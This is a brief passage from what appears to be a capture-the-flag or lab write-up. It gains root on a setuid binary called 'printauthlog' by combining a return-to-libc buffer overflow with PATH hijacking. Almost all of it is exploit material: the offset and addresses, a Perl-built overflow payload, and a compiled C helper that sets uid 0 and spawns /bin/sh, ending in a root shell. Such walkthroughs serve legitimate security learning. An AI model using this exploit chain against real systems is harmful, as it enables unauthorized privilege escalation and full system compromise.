because we have an read-write access to this dir, i can assure that priviledge escalation<br>
with modify `PATH` environment<br>
```c
offset at 68
system@plt at 0x08049060
global string "Wrong password" at 0x804b008

payloads :
padding + system + junk + str_wrong
```

Finger Cross ...
```bash
$ echo 'int main(){setuid(0);setgid(0);system("/bin/sh");}' > Wrong.c;gcc Wrong.c -o Wrong &>/dev/null
$ PATH=.:$PATH ./printauthlog  `perl -e 'print("A" x 68 . "\x60\x90\x04\x08" . "BBBB" . "\x08\xb0\x04\x08")'`
# whoami
root
```